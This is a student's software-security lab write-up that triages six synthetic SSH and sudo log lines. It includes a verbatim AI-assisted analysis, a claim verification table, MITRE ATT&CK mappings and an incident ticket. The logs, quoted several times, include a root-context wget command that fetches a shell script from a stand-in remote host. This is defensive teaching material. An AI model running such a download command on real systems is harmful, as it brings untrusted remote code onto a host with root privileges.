# SecAI Lab 4: AI SOC Analysis, Verification, and Incident Ticket

Bright Omari Owusu
Software Security
November 4, 2026 (Central / America/Chicago)

## Scope and disclosure

The initial response and draft checks were AI-assisted. Evidence was checked against the provided logs and official MITRE pages, with RFC 1918 used for the private-address claim. This submission does not claim that the student personally completed independent verification. No operational incident-response action was performed.

This is an analysis of six synthetic instructor-provided log lines, not a live incident investigation. Host and timezone are unspecified. No supplied IP or URL was contacted. Evidence and the initial response are preserved unchanged.

## Original prompt and source logs

Analyze the following six instructor-provided log lines. Summarize what happened, rate severity with a reason, recommend next steps, and propose matching MITRE ATT&CK technique IDs with brief explanations. Separate observations from hypotheses. Do not assume missing events occurred.
2026-10-26 02:13:44 sshd[2211]: Failed password for root from 185.220.101.4 port 51122
2026-10-26 02:13:46 sshd[2211]: Failed password for root from 185.220.101.4 port 51130
2026-10-26 02:13:49 sshd[2214]: Failed password for admin from 185.220.101.4 port 51144
2026-10-26 02:14:02 sshd[2219]: Accepted password for jdoe from 185.220.101.4 port 51190
2026-10-26 02:14:40 sudo: jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh
2026-10-26 09:02:11 sshd[3301]: Accepted publickey for mlee from 10.0.4.22 port 40022

Line references used throughout: L1–L6 are the six logs above, in the same order. The prompt itself is not L1.

## Original AI response — verbatim

## Observations

Three SSH password failures targeted root (twice) and admin from 185.220.101.4 over five seconds. Thirteen seconds later, SSH accepted a password for jdoe from that same address. At 02:14:40, sudo recorded jdoe requesting /usr/bin/wget as root to retrieve http://203.0.113.50/x.sh. This line does not establish successful retrieval, file contents, or script execution.

At 09:02:11, SSH accepted public-key authentication for mlee from the private address 10.0.4.22. These lines provide no evidence linking that login to the earlier sequence or establishing whether it was authorized.

## Hypotheses and severity

The early sequence is consistent with password guessing followed by use of a valid account and an attempted privileged file download. Unauthorized access is plausible, but authorization, credential theft, and compromise are unconfirmed. Three failures alone do not establish a sustained brute-force campaign. A .sh filename does not prove malicious content.

**High triage priority, provisional:** a successful password login immediately follows failures from the same source, followed by a root-context download command. Potential impact is substantial if unauthorized; actual download success, execution, persistence, and data theft are not shown.

## Next steps

1. Preserve authentication, sudo, process, network, and file evidence; establish the host and timezone, and correlate surrounding events.
2. Verify jdoe's login and command with the account owner and approved activity records. Independently validate mlee's source and key.
3. Check wget outcome, destination file, hash, contents, ownership, and subsequent process activity without executing the file. Investigate other sessions and privilege changes.
4. If unauthorized activity is confirmed or active risk requires containment, isolate the host, terminate suspicious sessions, and revoke affected credentials through incident-response procedures.

## Proposed MITRE ATT&CK mappings

- **T1110.001 — Password Guessing:** tentative explanation for the clustered failures; intent and scale remain unconfirmed.
- **T1078 — Valid Accounts:** applicable if jdoe's accepted credentials were used adversarially; acceptance alone does not establish abuse.
- **T1548.003 — Sudo and Sudo Caching:** root-context sudo use is recorded; adversarial privilege escalation is a hypothesis.
- **T1105 — Ingress Tool Transfer:** wget suggests attempted inbound file transfer if adversarial; completion is unproven.
- **T1021.004 — SSH:** SSH access is observed; adversarial remote-service use is conditional. Lateral movement is not established.

## Claim verification

Verdicts evaluate the atomic excerpt, not whether an attack occurred. Correct means supported by supplied evidence or the cited official source; unsupported means unproved hypothesis or judgment, even where reasonable. No incorrect factual claim was identified. Recommendations are proposals and receive no completed-action verdict. L1–L6 refer to the six source lines in order. Checked November 4, 2026 (America/Chicago).

### Claims 1–9

| ID / claim | Verdict | Evidence | Reason |
| --- | --- | --- | --- |
| V01  /  Three SSH password failures; root twice, admin once. | Correct | L1–L3 | Exactly these three failed-password records occur. |
| V02  /  Failures came from 185.220.101.4. | Correct | L1–L3 | The source field is identical in all three records. |
| V03  /  Failures occurred over five seconds. | Correct | L1, L3 | 02:13:49 minus 02:13:44 = 5 seconds. |
| V04  /  Thirteen seconds later SSH accepted a password for jdoe. | Correct | L3–L4 | 02:14:02 minus 02:13:49 = 13 seconds; accepted password is explicit. |
| V05  /  jdoe login came from that same address. | Correct | L1–L4 | L4 source is 185.220.101.4; identity of the person is not established. |
| V06  /  At 02:14:40 sudo recorded jdoe requesting /usr/bin/wget as root. | Correct | L5 | USER=root, account jdoe and COMMAND are explicit. No process outcome appears. |
| V07  /  Command intended retrieval of http://203.0.113.50/x.sh. | Correct | L5; MITRE T1105 | The command contains wget and this URL; intention does not prove a network request completed. |
| V08  /  Line does not establish successful retrieval, contents, or script execution. | Correct | L5; full L1–L6 | No output, exit status, file content or execution record is provided. |
| V09  /  At 09:02:11 SSH accepted public-key authentication for mlee from 10.0.4.22. | Correct | L6 | All fields match the record. |

### Claims 10–18

| ID / claim | Verdict | Evidence | Reason |
| --- | --- | --- | --- |
| V10  /  10.0.4.22 is a private address. | Correct | RFC 1918 §3; L6 | 10.0.4.22 falls within 10.0.0.0–10.255.255.255. Private addressing does not establish authorization. |
| V11  /  No evidence links mlee login to earlier sequence or establishes authorization. | Correct | L1–L6 | Different account/source/time; no correlation or approval records supplied. Absence of evidence is not proof of independence. |
| V12  /  Early sequence is consistent with password guessing. | Unsupported | L1–L3; T1110.001 | Reasonable attack hypothesis. Failures alone do not prove intent, password values, automation, or guessing. |
| V13  /  Sequence is consistent with use of a valid account. | Correct | L4; T1078 | L4 supports accepted authentication for jdoe. This observation does not assert adversarial use. |
| V13a  /  Separate hypothesis: Adversarial use of jdoe’s accepted credentials occurred. | Unsupported | L4; T1078 | Actual account abuse is unproved; authorization and actor identity are unknown. |
| V14  /  Sequence is consistent with an attempted privileged file download. | Correct | L5 | A root-context wget command is recorded. This is a command-level attempt, not proof of process/network success. |
| V15  /  Unauthorized access is plausible. | Unsupported | L1–L5 | Reasonable hypothesis from clustered failures, acceptance, and privileged command; no authorization evidence. |
| V16  /  Authorization, credential theft, and compromise are unconfirmed. | Correct | Full L1–L6 | No approval records, credential acquisition, or independent compromise evidence supplied. |
| V17  /  Three failures do not establish a sustained brute-force campaign. | Correct | L1–L3 | The evidence contains only three failures across five seconds; no sustained activity is demonstrated. |
| V18  /  A .sh filename does not prove malicious content. | Correct | L5 | Only a URL filename is visible; contents are absent. |

### Claims 19–27

| ID / claim | Verdict | Evidence | Reason |
| --- | --- | --- | --- |
| V19  /  High triage priority, provisional. | Unsupported | L1–L5 | Analyst risk judgment, not measured incident severity. Urgent review is reasonable given accepted credentials and root-context command; authorization and outcome remain unknown. |
| V20  /  Successful password login immediately follows failures from same source. | Correct | L1–L4 | Next supplied event is L4, 13 seconds after last failure; immediately means sequence proximity, not zero delay. |
| V21  /  Login is followed by a root-context download command. | Correct | L4–L5 | Command occurs 38 seconds after accepted login. Session linkage is plausible but not proven by a shared session identifier. |
| V22  /  Potential impact is substantial if unauthorized. | Unsupported | L5 | Risk assessment: root-context activity could affect the host; neither unauthorized use nor actual impact is established. |
| V23  /  Actual download success, execution, persistence and data theft are not shown. | Correct | Full L1–L6 | No corresponding outcome, execution, persistence or exfiltration evidence appears. |
| V24  /  T1110.001 — Password Guessing exists with this title. | Correct | Official MITRE T1110.001 | Canonical ID and sub-technique name verified; see ATT&CK table. |
| V25  /  T1110.001 tentatively explains failures; intent and scale unconfirmed. | Unsupported | L1–L3; official MITRE | Conditional hypothesis consistent with guessing; authentication failures alone are insufficient for confirmation. |
| V26  /  T1078 — Valid Accounts exists with this title. | Correct | Official MITRE T1078 | Canonical ID and technique name verified. |
| V27  /  T1078 applies if accepted credentials were used adversarially; acceptance alone is not abuse. | Correct | L4; official MITRE | The official T1078 description requires adversarial account abuse; the excerpt correctly makes applicability conditional and does not equate acceptance with abuse. |
| V27a  /  Separate hypothesis: T1078 Valid Accounts occurred as adversarial account abuse. | Unsupported | L4; official MITRE T1078 | Authentication is accepted, but adversarial credential use and account type are unverified. |

### Claims 28–33

| ID / claim | Verdict | Evidence | Reason |
| --- | --- | --- | --- |
| V28  /  T1548.003 — Sudo and Sudo Caching exists with this title. | Correct | Official MITRE T1548.003 | Canonical ID and sub-technique name verified. |
| V29  /  Root-context sudo is recorded; adversarial privilege escalation is a hypothesis. | Correct | L5; official MITRE | L5 records sudo with USER=root. Calling adversarial escalation a hypothesis correctly states the evidence limit; no caching or sudoers abuse is shown. |
| V29a  /  Separate hypothesis: Adversarial privilege escalation under T1548.003 occurred. | Unsupported | L5; official MITRE T1548.003 | Root-context sudo use alone does not establish malicious elevation, caching or sudoers abuse. |
| V30  /  T1105 — Ingress Tool Transfer exists with this title. | Correct | Official MITRE T1105 | Canonical ID and technique name verified. |
| V31  /  wget suggests attempted inbound transfer if adversarial; completion unproven. | Correct | L5; official MITRE | The command supports an attempted inbound-transfer candidate. The excerpt correctly conditions adversarial applicability and states completion is unproved. |
| V31a  /  Separate hypothesis: Adversarial Ingress Tool Transfer under T1105 occurred. | Unsupported | L5; official MITRE T1105 | Command recorded; malicious purpose, completed transfer and compromised environment remain unverified. |
| V32  /  T1021.004 — SSH exists with this title. | Correct | Official MITRE T1021.004 | Canonical ID and sub-technique name verified. |
| V33  /  SSH is observed; adversarial remote-service use is conditional; lateral movement is not established. | Correct | L1–L4, L6; official MITRE | SSH is recorded in L1–L4 and L6. The excerpt correctly leaves adversarial use conditional and lateral movement unestablished; MITRE lists the Lateral Movement tactic. |
| V33a  /  Separate hypothesis: Adversarial SSH lateral movement under T1021.004 occurred. | Unsupported | L1–L4, L6; official MITRE T1021.004 | No adversarial movement between hosts or linked internal pivot is demonstrated. Protocol observation alone is insufficient. |

### Recommendation scope

| ID | Recommendation excerpt | Classification | Scope / limitation |
| --- | --- | --- | --- |
| R1 | Preserve authentication, sudo, process, network and file evidence; establish host/timezone; correlate surrounding events. | Proposal | L1–L6 supply only a narrow excerpt. No preservation or correlation is claimed completed. |
| R2 | Verify jdoe login/command with owner and approved activity records; independently validate mlee source/key. | Proposal | Authorization and relationship are unknown. No owner contact or validation is claimed completed. |
| R3 | Check wget outcome, destination file/hash/contents/ownership, subsequent process activity, other sessions and privilege changes without executing file. | Proposal | L5 gives no outcome or file evidence. No retrieval, execution, inspection or investigation is claimed completed. |
| R4 | If unauthorized activity is confirmed or active risk requires containment, isolate host, terminate suspicious sessions and revoke affected credentials through response procedures. | Conditional proposal | Containment is not a completed action and does not assert confirmed compromise. Ticket below lists exactly the first three actions; this is a later conditional option from the frozen response. |

## MITRE ATT&CK verification

All five IDs and canonical names were checked on the official MITRE ATT&CK pages on November 4, 2026 (America/Chicago). Existence is verified; adversarial applicability is conditional. Parent-prefixed page titles are shown separately from canonical technique names. These are hypotheses, not a confirmed attack chain.

| ID / canonical name | Official page title / URL | Existence vs appropriateness; supporting lines |
| --- | --- | --- |
| T1110.001 — Password Guessing | Brute Force: Password Guessing<br>https://attack.mitre.org/techniques/T1110/001/ | L1–L3: Exists; tentative. Three failures could reflect guessing, but intent, password values and scale unknown. |
| T1078 — Valid Accounts | Valid Accounts<br>https://attack.mitre.org/techniques/T1078/ | L4: Exists; conditional on adversarial credential use. Accepted login alone is insufficient; account type unknown. |
| T1548.003 — Sudo and Sudo Caching | Abuse Elevation Control Mechanism: Sudo and Sudo Caching<br>https://attack.mitre.org/techniques/T1548/003/ | L5: Exists; conditional on adversarial elevation. Sudo root context recorded; caching, sudoers abuse and unauthorized escalation unproven. |
| T1105 — Ingress Tool Transfer | Ingress Tool Transfer<br>https://attack.mitre.org/techniques/T1105/ | L5: Exists; attempted-transfer hypothesis only. MITRE describes adversarial inbound files and names wget. Completion, content and compromised environment unproven. |
| T1021.004 — SSH | Remote Services: SSH<br>https://attack.mitre.org/techniques/T1021/004/ | L1–L4, L6: Exists; weak/conditional candidate. MITRE tactic is Lateral Movement. SSH alone does not demonstrate adversarial movement between hosts; do not report confirmed lateral movement. |

## Incident ticket

Title: Suspicious SSH password login followed by a root-context wget command

Status: Open for triage; synthetic exercise. Authorization and compromise unconfirmed.

Affected scope: Account jdoe; host unspecified. Source 185.220.101.4; command URL http://203.0.113.50/x.sh. mlee is a separate unverified event, not an established affected account or linked activity.

Severity: Provisional high triage priority: three failures are followed by accepted jdoe password authentication from the same source and a sudo command targeting root context. If unauthorized, this warrants urgent review because privileged activity could materially affect the host. Actual impact is unknown.

Root-context command: jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh

Evidence limits: No proof the download succeeded, the script executed, the file was malware, the host or account was compromised, or any attribution or lateral movement occurred. No persistence or data theft is demonstrated. Host and timezone are unspecified; no session identifier proves L4 and L5 belong to one session. The mlee event is neither confirmed benign nor malicious.

### Exact timeline

| Timestamp (timezone unspecified) | Evidence / observation |
| --- | --- |
| 2026-10-26 02:13:44 | L1: sshd[2211]: Failed password for root from 185.220.101.4 port 51122 |
| 2026-10-26 02:13:46 | L2: sshd[2211]: Failed password for root from 185.220.101.4 port 51130 |
| 2026-10-26 02:13:49 | L3: sshd[2214]: Failed password for admin from 185.220.101.4 port 51144 |
| 2026-10-26 02:14:02 | L4: sshd[2219]: Accepted password for jdoe from 185.220.101.4 port 51190 |
| 2026-10-26 02:14:40 | L5: sudo: jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh |
| 2026-10-26 09:02:11 | L6: sshd[3301]: Accepted publickey for mlee from 10.0.4.22 port 40022 |

### First three response actions — ordered proposals

1. Preserve available authentication, sudo, process, network and file evidence; identify the host and timezone and correlate surrounding records.

2. Verify jdoe’s login and command with the account owner and approved activity records; separately validate mlee’s source and key.

3. Determine wget outcome and inspect any existing destination file, hash, contents, ownership and subsequent process activity without executing it; review other sessions and privilege changes.

No response action has been performed. The supplied indicators were treated as text only.

## References

| Reference | Purpose |
| --- | --- |
| https://attack.mitre.org/techniques/T1110/001/ | Canonical ATT&CK identity and conditional behavior comparison; checked November 4, 2026 (America/Chicago). |
| https://attack.mitre.org/techniques/T1078/ | Canonical ATT&CK identity and conditional behavior comparison; checked November 4, 2026 (America/Chicago). |
| https://attack.mitre.org/techniques/T1548/003/ | Canonical ATT&CK identity and conditional behavior comparison; checked November 4, 2026 (America/Chicago). |
| https://attack.mitre.org/techniques/T1105/ | Canonical ATT&CK identity and conditional behavior comparison; checked November 4, 2026 (America/Chicago). |
| https://attack.mitre.org/techniques/T1021/004/ | Canonical ATT&CK identity and conditional behavior comparison; checked November 4, 2026 (America/Chicago). |
| https://www.rfc-editor.org/info/rfc1918/ | Section 3: private address space includes 10.0.0.0–10.255.255.255; checked November 4, 2026 (America/Chicago). |
| Instructor-provided prompt and six synthetic logs | Primary exercise evidence; reproduced below. |
